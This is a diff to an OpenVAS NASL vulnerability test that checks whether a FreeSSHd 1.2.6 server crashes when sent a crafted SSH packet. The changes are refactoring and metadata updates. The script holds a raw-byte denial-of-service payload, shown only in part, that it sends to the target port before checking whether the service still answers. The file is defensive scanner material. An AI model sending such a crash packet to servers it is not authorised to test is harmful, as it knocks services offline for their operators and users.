@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_freesshd_remote_dos_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
+# $Id: secpod_freesshd_remote_dos_vuln.nasl 13568 2019-02-11 10:22:27Z cfischer $
 #
 # FreeSSHd Remote Denial of Service Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902803");
-  script_version("$Revision: 11997 $");
+  script_version("$Revision: 13568 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-11 11:22:27 +0100 (Mon, 11 Feb 2019) $");
   script_tag(name:"creation_date", value:"2011-12-26 15:15:15 +0530 (Mon, 26 Dec 2011)");
   script_name("FreeSSHd Remote Denial of Service Vulnerability");
   script_xref(name:"URL", value:"http://www.1337day.com/exploits/17299");
@@ -44,41 +44,39 @@ if(description)
   script_family("Denial of Service");
   script_dependencies("ssh_detect.nasl");
   script_require_ports("Services/ssh", 22);
+  script_mandatory_keys("ssh/server_banner/available");
+
   script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
-application to crash, creating a denial-of-service condition.");
-  script_tag(name:"affected", value:"freeSSHd version 1.2.6");
+  application to crash, creating a denial-of-service condition.");
+
+  script_tag(name:"affected", value:"freeSSHd version 1.2.6.");
+
   script_tag(name:"insight", value:"The flaw is due to an error when processing certain requests and
-can be exploited to cause a denial of service via a specially crafted packet.");
+  can be exploited to cause a denial of service via a specially crafted packet.");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
   of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
   release, disable respective features, remove the product or replace the product by another one.");
+
   script_tag(name:"summary", value:"The host is running FreeSSHd and is prone to denial of service
-vulnerability.");
+  vulnerability.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
+
   exit(0);
 }
 
+include("ssh_func.inc");
 
-port = get_kb_item("Services/ssh");
-if(!port){
-  port = 22;
-}
-
-if(!get_port_state(port)){
-  exit(0);
-}
+port = get_ssh_port(default:22);
 
 soc = open_sock_tcp(port);
-if(!soc){
+if(!soc)
   exit(0);
-}
 
-## Receive Banner
 banner = recv(socket:soc, length:1024);
-
-if("WeOnlyDo" >!< banner){
+if(!banner || "WeOnlyDo" >!< banner)
   exit(0);
-}
 
 req = raw_string(
 		0x53, 0x53, 0x48, 0x2d, 0x32, 0x2e, 0x30, 0x2d,
@@ -199,7 +197,6 @@ req = raw_string(
 		0x88, 0xd2, 0xef, 0x69, 0xf7, 0x35, 0x7f, 0x9b,
     0x2a, 0x68, 0x8b, 0x45, 0x27);
 
-## Sending Exploit
 send(socket:soc, data:req);
 
 close(soc);
@@ -211,7 +208,10 @@ if(!soc2){
 }
 
 banner = recv(socket:soc2, length:1024);
-if("WeOnlyDo" >!< banner){
-  security_message(port);
-}
 close(soc2);
+if(!banner || "WeOnlyDo" >!< banner){
+  security_message(port:port);
+  exit(0);
+}
+
+exit(99);
